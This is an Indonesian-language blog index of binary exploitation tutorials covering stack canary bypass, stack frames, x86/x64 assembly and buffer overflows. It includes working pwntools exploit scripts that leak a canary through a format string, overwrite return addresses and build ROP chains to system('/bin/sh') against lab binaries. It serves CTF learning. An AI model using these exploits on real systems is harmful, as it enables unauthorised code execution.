\u0026lt;vulnerable\u0026gt;: 80484db: 55 push ebp 80484dc: 89 e5 mov ebp,esp 80484de: 83 ec 38 sub esp,0x38 ; Alokasi 56 byte di stack 80484e1: 65 a1 14 00 00 00 mov eax,gs:0x14 ; Load canary dari TLS 80484e7: 89 45 f4 mov DWORD PTR [ebp-0xc],eax ; Simpan canary di stack 80484ea: 31 c0 xor eax,eax ; Clear eax 80484ec: 8d 45 d4 lea eax,[ebp-0x2c] ; Load address buffer 80484ef: 89 04 24 mov DWORD PTR [esp],eax 80484f2: e8 a9 fe ff ff call 80483a0 \u0026lt;printf@plt\u0026gt; ; Print buffer address 80484f7: c7 44 24 08 64 00 00 mov DWORD PTR [esp+0x8],0x64 ; Argumen read: 100 byte 80484fe: 00 80484ff: 8d 45 d4 lea eax,[ebp-0x2c] ; Buffer address 8048502: 89 44 24 04 mov DWORD PTR [esp+0x4],eax 8048506: c7 04 24 00 00 00 00 mov DWORD PTR [esp],0x0 ; stdin 804850d: e8 8e fe ff ff call 80483a0 \u0026lt;read@plt\u0026gt; ; Vulnerable read 8048512: 8d 45 d4 lea eax,[ebp-0x2c] ; Buffer address 8048515: 89 04 24 mov DWORD PTR [esp],eax 8048518: e8 73 fe ff ff call 8048390 \u0026lt;printf@plt\u0026gt; ; Print buffer content 804851d: 8b 45 f4 mov eax,DWORD PTR [ebp-0xc] ; Load canary dari stack 8048520: 65 33 05 14 00 00 00 xor eax,gs:0x14 ; Bandingkan dengan canary asli 8048527: 74 05 je 804852e \u0026lt;vulnerable+0x53\u0026gt; ; Jika sama, lanjut 8048529: e8 92 fe ff ff call 80483c0 \u0026lt;__stack_chk_fail@plt\u0026gt; ; Jika beda, abort 804852e: c9 leave 804852f: c3 ret Layout Stack yang Terperinci Dari analisis assembly, kita dapat menentukan layout stack yang tepat:\nAlamat Relatif Ukuran Konten ebp-0x2c 40 buffer[40] ebp-0x2c+40 8 Padding (alignment) ebp-0xc 4 Stack Canary ebp-0x8 4 Saved EBP ebp-0x4 4 Return Address Perhitungan yang Penting:\nBuffer dimulai di ebp-0x2c (44 byte dari ebp) Canary berada di ebp-0xc (12 byte dari ebp) Jarak dari buffer ke canary: 44 - 12 = 32 byte Setelah canary, ada 8 byte (saved ebp) sebelum return address Praktek Eksploitasi Langkah demi Langkah Eksploitasi dengan Format String Leak from pwn import * # Setup context untuk architecture dan OS context(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;) # Jalankan program vulnerable p = process(\u0026#39;./vuln\u0026#39;) # Langkah 1: Dapatkan alamat buffer dari output p.recvuntil(\u0026#39;at \u0026#39;) buffer_addr = int(p.recvline().strip(), 16) log.info(\u0026#34;Buffer address: 0x%x\u0026#34; % buffer_addr) # Langkah 2: Gunakan format string untuk leak canary # Dalam arsitektur 32-bit, parameter format string biasanya mulai dari [esp+4] # Kita perlu menemukan offset yang tepat untuk canary p.sendline(\u0026#39;%7$p\u0026#39;) # Coba offset 7 (mungkin perlu disesuaikan) # Langkah 3: Parse output untuk mendapatkan canary output = p.recvuntil(\u0026#39;Hello,\u0026#39;) canary_str = output.split(b\u0026#39;Hello,\u0026#39;)[0].strip() try: canary = int(canary_str, 16) log.info(\u0026#34;Leaked canary: 0x%x\u0026#34; % canary) except: log.error(\u0026#34;Failed to leak canary. Try different offset.\u0026#34;) # Coba offset lain secara brute force for i in range(1, 20): p = process(\u0026#39;./vuln\u0026#39;) p.recvuntil(\u0026#39;at \u0026#39;) p.sendline(\u0026#39;%\u0026#39; + str(i) + \u0026#39;$p\u0026#39;) output = p.recvuntil(\u0026#39;Hello,\u0026#39;) val = output.split(b\u0026#39;Hello,\u0026#39;)[0].strip() log.info(\u0026#34;Offset %d: %s\u0026#34; % (i, val)) p.close() exit(1) # Langkah 4: Siapkan payload dengan canary yang valid offset = 32 # Jarak dari buffer ke canary payload = b\u0026#39;A\u0026#39; * offset # Mengisi sampai tepat sebelum canary payload += p32(canary) # Canary yang valid (tidak diubah) payload += b\u0026#39;B\u0026#39; * 8 # Mengisi saved EBP dan padding payload += p32(0xdeadbeef) # Return address yang ingin kita overwrite # Langkah 5: Kirim payload p.sendline(payload) # Langkah 6: Interact dengan shell jika berhasil p.interactive() Penjelasan Detail Eksploitasi Leak Canary dengan Format String:\nFormat string %7$p akan membaca nilai ke-7 dari stack Nilai ini kemungkinan adalah canary karena posisinya di stack Canary biasanya dikenali karena diawali null byte (0x00) Crafting Payload:\n32 byte pertama: Mengisi buffer tanpa mengubah canary 4 byte berikutnya: Canary asli yang telah kita leak 8 byte berikutnya: Mengisi saved EBP (bisa apa saja) 4 byte terakhir: Return address yang kita kontrol Mengatasi Randomization:\nCanary berbeda setiap eksekusi, jadi harus di-leak setiap kali Jika offset format string tidak tepat, perlu brute force Debugging Mendalam dengan Pwndbg Memahami Proses Debugging Debugging adalah kunci untuk memahami dan mengeksploitasi vulnerability. Berikut langkah-langkah detail dengan Pwndbg:\n1. Menjalankan Program dengan Input Test # Crash program tanpa canary yang valid pwndbg\u0026gt; r \u0026lt;\u0026lt;\u0026lt; $(python -c \u0026#34;print \u0026#39;A\u0026#39;*44 + \u0026#39;B\u0026#39;*4 + \u0026#39;C\u0026#39;*8 + \u0026#39;D\u0026#39;*4\u0026#34;) # Program akan crash di __stack_chk_fail 2. Memeriksa Nilai Canary di Stack pwndbg\u0026gt; x/xw $ebp-0xc # Lihat nilai canary di stack 0xffffd00c: 0x41414141 # Terlihat canary telah ter-overwrite dengan \u0026#39;AAAA\u0026#39; 3. Mencari Offset Format String yang Tepat pwndbg\u0026gt; r \u0026lt;\u0026lt;\u0026lt; $(python -c \u0026#34;print \u0026#39;%7$p\u0026#39;\u0026#34;) # Perhatikan output, cari nilai yang looks like canary (biasanya diawali null byte) 4. Step-by-Step Execution pwndbg\u0026gt; b *0x804851d # Breakpoint sebelum canary check pwndbg\u0026gt; r pwndbg\u0026gt; ni # Step through instruction # Perhatikan nilai register dan stack saat canary verification 5. Memverifikasi Canary yang Dileak # Setelah mendapatkan canary melalui format string pwndbg\u0026gt; p/x 0xefbeadde # Ganti dengan nilai yang dileak $1 = 0xefbeadde pwndbg\u0026gt; x/xw $ebp-0xc # Bandingkan dengan nilai di stack 0xffffd00c: 0xefbeadde 6. Testing Payload Final # Dengan canary yang valid pwndbg\u0026gt; r \u0026lt;\u0026lt;\u0026lt; $(python -c \u0026#34;print \u0026#39;A\u0026#39;*32 + \u0026#39;\\xde\\xad\\xbe\\xef\u0026#39; + \u0026#39;B\u0026#39;*8 + \u0026#39;\\xef\\xbe\\xad\\xde\u0026#39;\u0026#34;) # Program tidak akan crash di __stack_chk_fail tapi di 0xdeadbeef Analisis Register dan Memory Selama Debugging Selama proses debugging, perhatikan register dan memory berikut:\nEAX: Berisi nilai canary yang di-load dari stack GS:0x14: Berisi nilai canary asli dari Thread Local Storage EBP-0xc: Alamat canary di stack Stack setelah canary: Berisi saved EBP dan return address 5. Tips dan Strategi CTF Identifikasi Vulnerability Type: Format string, buffer overflow, dll. Check Protections: Gunakan checksec untuk melihat ada canary atau tidak. Cara Dapat Canary: Format string leak Output yang menampilkan nilai stack Brute force (jika fork server) Hitung Offset dengan Akurat: Gunakan pattern create/pattern offset dalam pwntools. Pastikan Endianness: 32-bit little endian biasanya. 6. Advanced Techniques Bypass EXIT-based Canary Protection: Beberapa implementasi hanya memeriksa canary jika fungsi menggunakan return, tetapi tidak jika menggunakan exit() atau longjmp().\nOverwrite Stack Pointer: Alih-alih mengembalikan ke shellcode, arahkan stack pointer ke area yang bisa dikontrol.\nThread-specific Canaries: Pada program multithread, setiap thread punya canary sendiri yang perlu di-leak secara terpisah.\nKesimpulan Bypass stack canaries membutuhkan:\nPemahaman mendalam tentang layout stack Kemampuan untuk membaca dan memanipulasi nilai di stack Teknik yang tepat berdasarkan situasi (leak, brute force, dll.) Tools yang membantu analisis dan exploit development Practice makes perfect! Coba challenge binary exploitation di platform CTF seperti pwnable.tw, pwnable.kr, atau CTFtime.org\n","permalink":"/posts/stack-canary-bf/","title":"Bypass Stack Canary - Pwn03"},{"content":"Dalam binary exploitation, memahami struktur stack frame dan memory layout adalah fundamental. Artikel ini akan menjelaskan secara step-by-step bagaimana stack bekerja, cara membaca memory dengan pwndbg, dan visualisasi yang mudah dipahami. Kita mulai dari layout memory, penggunaan pwndbg, parsing stack, hingga cara membacanya untuk keperluan binary exploitation.\n1. Layout Memory dan Stack Frame Stack adalah struktur data LIFO (Last In, First Out) yang digunakan untuk menyimpan data sementara, seperti variabel lokal, return address, dan saved base pointer. Berikut tahapan pembentukan stack frame:\n1️⃣ Sebelum Masuk Fungsi (Baru Call Main) Saat fungsi dipanggil (misal call main), beberapa hal terjadi:\nReturn Address disimpan di stack (untuk kembali setelah fungsi selesai). RBP lama (base pointer fungsi sebelumnya) akan disimpan. [ High Address ] | Argumen fungsi lama | | Return Address | ← call simpan ini | RBP lama (Base Pointer Old) | ← punya fungsi sebelumnya [ Low Address ] RSP (Stack Pointer) menunjuk ke RBP lama. Belum ada stack frame baru. 2️⃣ Setelah push rbp; mov rbp, rsp Instruksi ini membentuk stack frame baru:\npush rbp → Simpan RBP lama ke stack. mov rbp, rsp → RBP baru = RSP saat ini. [ High Address ] | Argumen fungsi lama | | Return Address | | RBP lama (Base Pointer Old) | ← disimpan oleh `push rbp` RBP → posisi ini [ Low Address ] RBP sekarang menunjuk ke lokasi ini (base frame baru). RSP = RBP (belum ada variabel lokal). 3️⃣ Setelah Alokasi Variabel Lokal (sub rsp, X) Untuk variabel lokal (misal int x;), stack dialokasikan dengan sub rsp, 0x20 (misal 32 byte).\n[ High Address ] | Argumen fungsi lama | | Return Address | | RBP lama (Base Pointer Old) | ← dari `push rbp` RBP → posisi ini | Variabel lokal (int x; int b; …) | | Data sementara | RSP → posisi terendah frame sekarang [ Low Address ] RSP turun untuk memberi ruang variabel lokal. RBP tetap di tempat, memudahkan akses argumen \u0026amp; variabel. 2. Contoh Nyata dengan pwndbg Misal kita memiliki kode assembly:\npush rbp mov rbp, rsp sub rsp, 0x20 Nilai Register Sebelum \u0026amp; Sesudah sub rsp, 0x20 Register Sebelum (mov rbp, rsp) Sesudah (sub rsp, 0x20) RBP 0x7fffffffda00 0x7fffffffda00 (tetap) RSP 0x7fffffffda00 0x7fffffffd9e0 Perhitungan:\nRSP baru = RSP lama - 0x20 = 0x7fffffffda00 - 0x20 = 0x7fffffffd9e0 3. Chain Stack Frame (Linked List RBP) Dalam debugging, kita sering melihat struktur seperti:\nRBP =\u0026gt; 0x7fffffffda00 → 0x7fffffffdaa0 → 0x7fffffffdb00 → ... Ini adalah linked list stack frame:\nSetiap RBP menyimpan RBP fungsi sebelumnya. Berguna untuk stack unwinding (kembali ke fungsi pemanggil). Visualisasi Stack Frame Higher Address ┌─────────────────┐ │ ... │ ├─────────────────┤ │ RBP = 0x7fffffffdb00 │ ← Frame sebelum `main` (libc) ├─────────────────┤ │ ... │ ├─────────────────┤ │ RBP = 0x7fffffffdaa0 │ ← Frame pemanggil `main` (misal `_start`) ├─────────────────┤ │ ... │ ├─────────────────┤ │ RBP = 0x7fffffffda00 │ ← Frame `main` (saat ini) ├─────────────────┤ │ Local Variables │ (RSP = 0x7fffffffd9e0) └─────────────────┘ Lower Address Mekanisme Return dari Fungsi Saat fungsi selesai, instruksi leave dan ret bekerja:\nleave ; setara dengan: mov rsp, rbp; pop rbp ret ; pop return address dan jump ke sana leave mengembalikan RSP dan RBP ke keadaan semula. ret kembali ke caller menggunakan return address. 4. Tips Cepat Mengingat Stack Frame push rbp → Simpan patokan lama (RBP fungsi sebelumnya). mov rbp, rsp → Pasang patokan baru (RBP = RSP saat ini). sub rsp, X → Alokasi ruang untuk variabel lokal. 💡 Patokan = Base Pointer (RBP)\nPosisi Sekarang = Stack Pointer (RSP)\n5. Aplikasi dalam Binary Exploitation Dengan memahami stack frame, kita bisa:\nBuffer Overflow → Timpa return address untuk kontrol alur program. ROP Chaining → Manfaatkan saved RBP dan return address untuk eksekusi kode. Memory Leak → Baca nilai stack untuk bypass ASLR. Kesimpulan Stack frame adalah struktur fundamental dalam eksekusi program. RBP = Base Pointer (patokan stack frame saat ini). RSP = Stack Pointer (posisi terakhir di stack). Chain RBP membentuk linked list untuk kembali ke fungsi sebelumnya. Pemahaman stack penting untuk binary exploitation. ","permalink":"/posts/memory-layout/","title":"Memahami Stack Frame dan Memory Layout - pwn02"},{"content":"1. Apa itu Bahasa Assembly? Bahasa Assembly adalah bahasa pemrograman tingkat rendah yang berhubungan langsung dengan instruksi CPU.\nBahasa ini tidak abstrak seperti Python atau C; setiap instruksi berhubungan langsung dengan operasi hardware.\nSetiap baris kode Assembly diterjemahkan oleh assembler menjadi opcode biner yang dipahami CPU.\nKenapa belajar Assembly?\nMemahami cara kerja komputer di level paling dasar. Berguna untuk reverse engineering, optimisasi performa, dan pemrograman embedded. Membantu memahami sistem operasi, compiler, dan arsitektur CPU. 2. Arsitektur x86 vs x64 x86 → Arsitektur 32-bit (register umum: EAX, EBX, ECX, EDX, ESI, EDI, ESP, EBP). x64 → Arsitektur 64-bit (register umum lebih banyak: RAX, RBX, RCX, RDX, RSI, RDI, RSP, RBP, + R8-R15). 32-bit vs 64-bit → Perbedaan utamanya: Ukuran register (32-bit vs 64-bit) Panjang pointer (alamat memori) Instruksi tambahan di x64 3. Memahami Register CPU Register adalah ruang penyimpanan kecil di dalam CPU untuk operasi cepat.\nRegister Ukuran Fungsi Utama Catatan EAX / RAX 32 / 64-bit Accumulator (operasi aritmatika) AL = 8-bit rendah EBX / RBX 32 / 64-bit Base register BL = 8-bit rendah ECX / RCX 32 / 64-bit Counter untuk loop CL = 8-bit rendah EDX / RDX 32 / 64-bit Data register (I/O, multiplikasi) DL = 8-bit rendah ESI / RSI 32 / 64-bit Source Index (string/memory ops) EDI / RDI 32 / 64-bit Destination Index ESP / RSP 32 / 64-bit Stack Pointer Menunjuk puncak stack EBP / RBP 32 / 64-bit Base Pointer Menunjuk frame stack fungsi Tips mengingat: EAX untuk hasil operasi, EBX buat backup, ECX untuk hitungan, EDX untuk data tambahan.\n4. Struktur Program Assembly Dasar Kita akan pakai NASM (Netwide Assembler) sebagai contoh.\nContoh program \u0026ldquo;Hello World\u0026rdquo; 32-bit di Linux:\nsection .data msg db \u0026#34;Hello, World!\u0026#34;, 0xA ; string + newline len equ $ - msg ; panjang string section .text global _start _start: ; syscall write(fd=1, buf=msg, count=len) mov eax, 4 ; nomor syscall (write) mov ebx, 1 ; file descriptor (stdout) mov ecx, msg ; alamat buffer mov edx, len ; panjang buffer int 0x80 ; interrupt ke kernel ; syscall exit(status=0) mov eax, 1 xor ebx, ebx ; status 0 int 0x80 Penjelasan baris demi baris:\nsection .data → Bagian data statis (string, angka). msg db \u0026quot;Hello, World!\u0026quot;, 0xA → Definisikan string + newline (0xA). len equ $ - msg → Hitung panjang string secara otomatis. section .text → Bagian kode program. global _start → Entry point program. mov eax, 4 → Syscall nomor 4 = write. mov ebx, 1 → File descriptor 1 = stdout. mov ecx, msg → Alamat buffer string. mov edx, len → Panjang string. int 0x80 → Panggil kernel. mov eax, 1 → Syscall exit. xor ebx, ebx → Set ebx = 0. int 0x80 → Keluar program. 5. Instruksi Dasar 5.1 mov Menyalin data dari sumber ke tujuan.\nmov eax, 5 ; eax = 5 mov ebx, eax ; ebx = eax 5.2 add, sub, inc, dec add eax, 10 ; eax = eax + 10 sub ebx, 2 ; ebx = ebx - 2 inc ecx ; ecx = ecx + 1 dec edx ; edx = edx - 1 5.3 mul dan div mov eax, 5 mov ebx, 3 mul ebx ; EAX = EAX * EBX 5.4 push \u0026amp; pop Digunakan untuk stack.\npush eax pop ebx 6. Menggunakan Stack \u0026amp; Fungsi Contoh memanggil fungsi:\nsection .text global _start _start: push 5 push 3 call tambah add esp, 8 ; bersihkan argumen mov ebx, eax mov eax, 1 int 0x80 tambah: mov eax, [esp+4] ; argumen pertama add eax, [esp+8] ; argumen kedua ret 7. Mode 32-bit vs 64-bit dalam Praktik Di 64-bit Linux, sistem call menggunakan register berbeda (bukan int 0x80):\nmov rax, 1 ; nomor syscall write mov rdi, 1 ; fd mov rsi, msg ; buffer mov rdx, len ; panjang syscall 8. Tips Memahami Assembly Lebih Cepat Gunakan disassembler seperti objdump -d untuk melihat assembly dari program C. Latihan konversi kode C → Assembly. Eksperimen di emulator seperti DOSBox atau QEMU. 9. Loop dan Control Flow Lanjutan Di Assembly, loop biasanya memanfaatkan register sebagai counter dan jump instructions.\n9.1 Loop dengan loop section .text global _start _start: mov ecx, 5 ; jumlah perulangan print_loop: mov eax, 4 mov ebx, 1 mov ecx, msg mov edx, len int 0x80 loop print_loop ; ECX -= 1, lompat kalau != 0 mov eax, 1 xor ebx, ebx int 0x80 section .data msg db \u0026#34;Halo!\u0026#34;, 0xA len equ $ - msg 9.2 Conditional Jumps Instruksi seperti:\nje → lompat jika equal (ZF=1) jne → lompat jika tidak equal jg / jge / jl / jle → lompat berdasarkan perbandingan signed ja / jb → untuk unsigned Contoh:\ncmp eax, ebx je sama jmp selesai sama: ; kode jika sama selesai: 10. Manipulasi Bit Manipulasi bit sering digunakan di optimisasi dan low-level hardware control.\nInstruksi umum:\nand eax, 0xFF ; ambil byte rendah or eax, 0x100 ; set bit ke-8 xor eax, eax ; reset ke 0 shl eax, 1 ; geser kiri (x2) shr eax, 1 ; geser kanan (÷2) Contoh cek bit ke-n:\nmov eax, value bt eax, 5 ; cek bit ke-5 jc bit_set ; lompat kalau bit 5 = 1 11. Interrupt Handler \u0026amp; System Calls 11.1 int 0x80 (Linux 32-bit) Kita sudah lihat di part 1, intinya:\neax → nomor syscall ebx, ecx, edx → argumen 11.2 syscall (Linux 64-bit) Di 64-bit:\nrax → nomor syscall rdi, rsi, rdx, r10, r8, r9 → argumen Contoh write di 64-bit:\nmov rax, 1 ; write mov rdi, 1 ; stdout mov rsi, msg mov rdx, len syscall 12. SIMD: SSE \u0026amp; AVX SIMD (Single Instruction Multiple Data) memungkinkan memproses banyak data sekaligus. SSE menggunakan register XMM (128-bit), AVX menggunakan YMM (256-bit).\nContoh menambahkan 4 angka float sekaligus dengan SSE:\nmovaps xmm0, [a] ; load 4 float dari array a movaps xmm1, [b] ; load 4 float dari array b addps xmm0, xmm1 ; xmm0 = xmm0 + xmm1 movaps [result], xmm0 13. Debugging Assembly dengan GDB 13.1 Compile tanpa optimisasi nasm -f elf32 program.asm -o program.o ld -m elf_i386 program.o -o program 13.2 Jalankan GDB gdb ./program 13.3 Perintah Penting layout asm → tampilkan assembly break _start → pasang breakpoint stepi → jalankan 1 instruksi info registers → lihat isi register x/10xb $ecx → lihat isi memori Contoh:\n(gdb) break _start (gdb) run (gdb) info registers (gdb) stepi Kita bisa lihat bagaimana eax, ecx, edx berubah setiap instruksi berjalan.\n14. Optimisasi Kode Assembly 14.1 Menghindari Instruksi Lambat Gunakan lea (Load Effective Address) untuk kalkulasi sederhana tanpa memori:\nlea eax, [ebx + ecx*4] lebih cepat daripada mov + add berulang.\n14.2 Loop Unrolling Alih-alih loop n kali, kita proses beberapa item per iterasi untuk mengurangi overhead jump.\n15. Tips Mahir Assembly Selalu cek manual CPU (Intel/AMD) untuk detail instruksi. Latihan dengan C → disassembly untuk memahami mapping instruksi. Gunakan simulator online seperti https://www.tutorialspoint.com/compile_assembly_online.php. ","permalink":"/posts/assembly-language/","title":"Belajar Bahasa Assembly (x86/x64, Termasuk 32bit)"},{"content":"\nBinary exploitation merupakan salah satu keahlian paling krusial dalam dunia penetration testing dan keamanan siber. Teknik ini memungkinkan kita menemukan dan memanfaatkan kerentanan tingkat lanjut dalam program dan sistem operasi, yang seringkali menjadi pintu masuk untuk mendapatkan kendali penuh atas sistem target (remote code execution) atau meningkatkan hak akses secara lokal (privilege escalation).\nSelama bertahun-tahun, berbagai proteksi telah dikembangkan untuk memitigasi kerentanan memori, mulai dari tingkat kernel sistem operasi hingga teknik kompilasi binary. Namun, selalu ada celah untuk mengeksploitasi kesalahan-kesalahan kecil dalam penanganan memori pada binary.\nKompetensi yang Diperlukan Untuk menguasai binary exploitation modern, diperlukan pemahaman mendalam tentang:\nBahasa Assembly (arsitektur x86/x64) Arsitektur Komputer (register, stack, heap, memory management) Fundamental Binary Exploitation (buffer overflow, ROP, format string) Bagi yang belum familiar dengan Assembly dan arsitektur komputer, sangat disarankan untuk mempelajari Artikel Bahasa Assembly. terlebih dahulu. Sedangkan untuk praktik dasar buffer overflow di Linux, modul \u0026ldquo;Tentang Binary Exploitation dan Buffer Overflow\u0026rdquo; menyediakan landasan yang baik.\nMemahami Buffer Overflow Secara Mendalam Konsep Dasar Buffer Overflow Buffer overflow terjadi ketika program menerima input data yang melebihi kapasitas buffer yang dialokasikan, menyebabkan data tersebut \u0026ldquo;meluap\u0026rdquo; (overflow) dan menimpa area memori sekitarnya. Fenomena ini terutama terjadi di stack memory, meskipun bisa juga terjadi di heap.\nMekanisme Overflow pada Stack Stack menggunakan prinsip LIFO (Last-In, First-Out). Setiap kali fungsi dipanggil:\nStack frame baru dibuat Return address (EIP/RIP) disimpan di stack Parameter fungsi dan variabel lokal ditempatkan di stack ; Contoh assembly sederhana push 0x41 ; Simpan nilai 0x41 (\u0026#39;A\u0026#39;) di stack push 0x42 ; Simpan nilai 0x42 (\u0026#39;B\u0026#39;) di stack pop eax ; Ambil nilai teratas (0x42) ke register EAX Visualisasi Stack Normal vs Stack Overflow Stack Normal:\n0x42 \u0026lt;-- Top of Stack (ESP) 0x41 ... Stack Overflow (input 12 byte pada buffer 8 byte):\n[Buffer (8 byte)] [EBP] [EIP] AAAAAAAA AAAA AAAA \u0026lt;-- EIP tertimpa! Nilai return address (EIP) tertimpa menjadi 0x41414141 (hex untuk \u0026lsquo;AAAA\u0026rsquo;) Program crash saat mencoba eksekusi di alamat invalid tersebut Klasifikasi Buffer Overflow 1. Berdasarkan Lokasi Memory Jenis Lokasi Karakteristik Stack Overflow Stack memory Paling umum, relatif mudah dieksploitasi Heap Overflow Heap memory Lebih kompleks, membutuhkan teknik khusus BSS Overflow .bss section Jarang, tapi mungkin pada program tertentu 2. Berdasarkan Teknik Exploitasi Denial of Service (DoS) Crash program dengan overflow sederhana Arbitrary Code Execution Redirect execution flow ke shellcode Return-Oriented Programming (ROP) Chain gadget untuk bypass proteksi memori Data Corruption Ubah nilai variabel kritis di memori Studi Kasus Nyata \u0026amp; Analisis Mendalam 1. iPhone Jailbreak (iOS 4 - greenpois0n) Vulnerability: Stack overflow pada HFS Volume Name Exploit Technique: // Pseudocode exploit char volume_name[256]; strcpy(volume_name, malicious_payload); // Overflow terjadi di sini Payload Structure: [NOP sled][shellcode][return address] Patch: iOS 4.3 memperkenalkan ASLR dan stack protection 2. PlayStation Portable (PSP - TIFF Exploit) Bug: Integer overflow pada TIFF parsing Exploit Flow: Buat file TIFF korup dengan dimensi gambar overflow Set background ke PNG korup Buka di Photo Viewer → EIP kontrol → shellcode execution Technical Details: # Contoh struktur exploit with open(\u0026#39;exploit.tiff\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(b\u0026#39;\\x49\\x49\\x2a\\x00\u0026#39;) # Header TIFF f.write(b\u0026#39;\\x08\\x00\\x00\\x00\u0026#39;) # Offset pertama f.write(b\u0026#39;\\xff\\xff\\xff\\x7f\u0026#39;) # Width overflow f.write(b\u0026#39;\\xff\\xff\\xff\\x7f\u0026#39;) # Height overflow f.write(b\u0026#39;A\u0026#39;*1000) # Payload 3. Nintendo Wii (Twilight Hack) Vulnerability: Stack overflow pada nama karakter Exploitasi: Ubah nama kuda \u0026ldquo;Epona\u0026rdquo; menjadi string panjang berisi payload Save game korup → load game → kontrol EIP Payload Design: [Junk data][hacked save function address][shellcode] Teknik Exploitasi Lanjutan 1. Return-Oriented Programming (ROP) Digunakan ketika:\nNX (No-Execute) diaktifkan ASLR membuat alamat shellcode tidak pasti Contoh ROP Chain:\nrop_chain = [ pop_rdi, # Gadget 1: pop rdi; ret binsh_addr, # Alamat string \u0026#34;/bin/sh\u0026#34; system_addr # Alamat fungsi system() ] 2. Bypass ASLR dengan Memory Leak Teknik:\nEksploitasi Format String bug untuk leak alamat libc Hitung base address libc Bangun ROP chain berdasarkan alamat aktual Contoh Implementasi:\n# Leak alamat puts payload = b\u0026#39;%7$p\u0026#39; send(payload) leak = int(recv(), 16) libc_base = leak - libc.sym.puts system_addr = libc_base + libc.sym.system 3. Heap Exploitation Modern Teknik Utama:\nUse-After-Free (UAF) Double Free Tcache Poisoning House of Spirit Contoh Use-After-Free:\n// Vulnerable code char *ptr = malloc(32); free(ptr); *ptr = \u0026#39;A\u0026#39;; // UAF terjadi di sini Proteksi Modern \u0026amp; Teknik Bypass 1. NX/XD (No-Execute) Cara Bypass: ROP, ret2libc Contoh: rop = flat([ pop_rdi, binsh, ret, # Stack alignment system ]) 2. ASLR (Address Space Layout Randomization) Bypass Method: Memory leak Bruteforce (pada sistem 32-bit) Partial overwrite 3. Stack Canaries Cara Bypass: Leak canary melalui Format String Null byte overwrite (pada kasus tertentu) Bruteforce (jarang feasible) 4. RELRO (Relocation Read-Only) Implikasi: Full RELRO: GOT overwrite tidak mungkin Partial RELRO: Masih mungkin GOT overwrite Panduan Praktis Exploit Development Langkah-langkah Eksploitasi Buffer Overflow Fuzzing - Identifikasi titik overflow Offset Determination - Cari jarak ke EIP/RIP pattern create 200 pattern offset $eip Control EIP - Verifikasi kontrol alamat return Bad Character Analysis - Identifikasi byte terlarang Shellcode Development - Buat payload efektif Exploit Finalization - Gabungkan semua komponen Contoh Script Exploit Lengkap from pwn import * context.arch = \u0026#39;i386\u0026#39; elf = ELF(\u0026#39;./vulnerable\u0026#39;) # 1. Crash program \u0026amp; cari offset offset = 76 # 2. ROP Chain rop = ROP(elf) rop.call(elf.sym.system, [next(elf.search(b\u0026#39;/bin/sh\u0026#39;))]) # 3. Bangun payload payload = flat({ offset: rop.chain() }) # 4. Kirim exploit io = process(elf.path) io.sendline(payload) io.interactive() Mengapa Masih Relevan Mempelajari Stack Overflow? 1. Fundamental Keamanan Memori Memahami konsep memory corruption Prinsip kontrol flow execution 2. Dasar untuk Teknik Lanjutan SEH overwrite pada Windows Heap exploitation modern Kernel space exploitation 3. Aplikasi di Sistem Legacy Embedded systems IoT devices Industrial control systems Sumber Belajar Lebih Lanjut Buku: \u0026ldquo;The Shellcoder\u0026rsquo;s Handbook\u0026rdquo; (Chris Anley) \u0026ldquo;Hacking: The Art of Exploitation\u0026rdquo; (Jon Erickson) CTF Challenges: picoCTF OverTheWire Hack The Box Paper Penelitian: \u0026ldquo;Smashing The Stack For Fun And Profit\u0026rdquo; (Aleph One) \u0026ldquo;Return-Oriented Programming\u0026rdquo; (Hovav Shacham) Dengan pemahaman mendalam tentang binary exploitation dan buffer overflow, Anda memiliki landasan kuat untuk menjelajahi dunia exploit development yang lebih advanced. Selamat belajar! 🚀\n","permalink":"/posts/buffer-overflow/","title":"Tentang Binary Exploitation dan Buffer Overflow - pwn01"},{"content":"Penjelasan sederhana tentang komponen komputer yang penting untuk dipahami dalam reverse engineering:\n1. CPU (Central Processing Unit) Apa itu? \u0026ldquo;Otak\u0026rdquo; komputer yang menjalankan instruksi program. Fungsi dalam RE: Ketika melakukan reverse engineering, Anda menganalisis bagaimana CPU memproses instruksi dari program (misalnya, bagaimana ia menghitung, membandingkan data, atau melompat ke bagian kode tertentu). Contoh: Saat debugging, Anda melihat instruksi assembly yang dijalankan CPU. CPU itu seperti Koki di Dapur Bayangkan:\nCPU = Koki yang melakukan semua perhitungan dan perintah. Program = Resep masakan yang harus diikuti koki. Ketika kamu menjalankan program (misalnya ls di terminal), CPU membaca instruksinya langkah demi langkah dan menjalankannya.\nContoh Nyata di Linux Kita akan pakai perintah strace untuk melihat instruksi sistem (system calls) yang dijalankan CPU saat sebuah program berjalan.\n1. Jalankan Perintah Sederhana Buka terminal, lalu ketik:\nstrace ls Ini akan menampilkan semua instruksi yang CPU kerjakan saat menjalankan ls (contoh output):\nexecve(\u0026#34;/usr/bin/ls\u0026#34;, [\u0026#34;ls\u0026#34;], 0x7ffd... /* 23 vars */) write(1, \u0026#34;file1.txt file2.txt\\n\u0026#34;, 20) exit(0) Apa Arti Output Ini? execve(): CPU memuat program ls ke memory. write(): CPU menampilkan output (file1.txt file2.txt) ke terminal. exit(): CPU mengakhiri program. Ini adalah \u0026ldquo;bahasa CPU\u0026rdquo; tingkat dasar!\n2. Debugging dengan ltrace (Lebih Sederhana) Jika strace terlalu rumit, coba ltrace untuk melihat fungsi library yang dipanggil:\nltrace ls Output:\nprintf(\u0026#34;file1.txt file2.txt\\n\u0026#34;) = 20 exit(0) Di sini kamu lihat CPU menjalankan printf() untuk menampilkan teks.\n3. Lihat Proses CPU dengan top Jalankan:\ntop Tekan q untuk keluar. Kamu akan melihat daftar program yang sedang CPU kerjakan, seperti:\nPID USER %CPU COMMAND 1234 user 5.0 firefox %CPU: Persentase penggunaan CPU oleh program tersebut. Apa Hubungannya dengan Reverse Engineering? Ketika kamu reverse engineering, kamu ingin tahu:\nInstruksi apa yang CPU jalankan (contoh: strace). Bagaimana program berinteraksi dengan sistem (contoh: ltrace). Nanti kalau sudah terbiasa, baru masuk ke assembly (bahasa mesin CPU).\nSummary untuk Pemula CPU = \u0026ldquo;Koki\u0026rdquo; yang menjalankan perintah. Gunakan strace/ltrace untuk melihat instruksi CPU. Gunakan top untuk melihat beban CPU. 2. Memory (RAM - Random Access Memory) Apa itu? Tempat penyimpanan sementara untuk data dan instruksi yang sedang diproses. Fungsi dalam RE: Menyimpan kode program yang sedang berjalan. Menyimpan variabel/data yang digunakan program. Dalam RE, Anda memeriksa isi memory untuk menemukan password, kunci 